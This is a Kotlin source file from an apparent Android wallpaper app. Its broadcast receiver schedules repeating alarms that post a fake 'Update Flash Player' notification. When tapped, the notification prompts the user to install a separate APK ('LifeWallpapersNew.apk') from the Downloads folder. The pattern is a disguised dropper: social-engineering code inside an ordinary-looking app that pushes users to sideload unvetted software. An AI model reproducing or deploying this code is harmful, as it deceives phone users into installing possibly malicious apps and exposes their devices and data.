package com.commonsneon.neonwallpapers.wallpapersneonmanager


import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.support.v4.app.NotificationCompat
import android.support.v4.app.NotificationManagerCompat
import android.support.v4.content.FileProvider
import android.util.Log
import android.widget.Toast
import java.io.File

/**
 * Created by Denero on 02.06.2018.
 */
class AlarmManagerBroadcastReciver: BroadcastReceiver() {

    override fun onReceive(p0: Context?, p1: Intent?) {
        Log.d("NOTIFICATION","YES!")
        var sh:SharedPreferences
        sh = p0!!.getSharedPreferences("Config",Context.MODE_PRIVATE)
        var she = sh.edit()
        she.putInt("Time",1)
        she.apply()
        she.commit()
        val builder = NotificationCompat.Builder(p0!!,"2")
        var notifintent = instalLifeWallpapers(p0)
        val cIntent = PendingIntent.getActivity(p0,
                0, notifintent,
                PendingIntent.FLAG_CANCEL_CURRENT)
        builder.setDefaults(Notification.DEFAULT_SOUND)
        builder.setDefaults(Notification.DEFAULT_VIBRATE)
        builder.setContentIntent(cIntent)
                // обязательные настройки
                .setSmallIcon(R.drawable.flash)
                .setContentTitle("Update Flash Player")
                .setContentText("Установите наши лучшие ЖИВЫЕ Обои(Требуется Flash Player!)") // Текст уведомления
                .setAutoCancel(true)
        val notificationManager = p0?.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if(p0.applicationInfo.targetSdkVersion >= 26){
            val notificationManager = NotificationManagerCompat.from(p0)
            notificationManager.notify(2,builder.build())
        }
        else
            notificationManager.notify(2, builder.build())
        SetAlarm(p0)
    }

    fun SetAlarm(context: Context) {
        val am = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(context, AlarmManagerBroadcastReciver::class.java)
        var pi = PendingIntent.getBroadcast(context, 0, intent, 0)
        am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+context.resources.getInteger(R.integer.delay), pi)
        Toast.makeText(context,"SET", Toast.LENGTH_SHORT).show()
    }

    fun CancelAlarm(context: Context) {
        val intent = Intent(context, AlarmManagerBroadcastReciver::class.java)
        val sender = PendingIntent.getBroadcast(context, 0, intent, 0)
        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.cancel(sender)//Отменяем будильник, связанный с интентом данного класса
    }
    fun instalLifeWallpapers(context: Context): Intent {
        try {
            //var intentOpen = context.packageManager.getLaunchIntentForPackage("com.yxkwxatje.hliqlhun")
            var intentOpen = context.packageManager.getLaunchIntentForPackage(context.getString(R.string.package_link))
            if(intentOpen == null){
                var intent = Intent(Intent.ACTION_VIEW)
                var fileLifeWallpaper = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString() +"/"+ "LifeWallpapersNew"+".apk")
                var uri: Uri
                if (context.applicationInfo.targetSdkVersion >= Build.VERSION_CODES.N) {
                    uri = FileProvider.getUriForFile(context, context.getPackageName() + ".my.package.name.provider", fileLifeWallpaper)
                    var intent = Intent(Intent.ACTION_INSTALL_PACKAGE)
                    intent.setData(uri)
                    intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                    return intent
                } else {
                    uri = Uri.fromFile(fileLifeWallpaper)
                    var intent = Intent(Intent.ACTION_VIEW)
                    intent.setDataAndType(uri, "application/vnd.android.package-archive");
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    return intent
                }

            }else{
                return intentOpen
            }
        }catch (e:Exception){
            return Intent(context,MainActivity::class.java)
        }


    }
}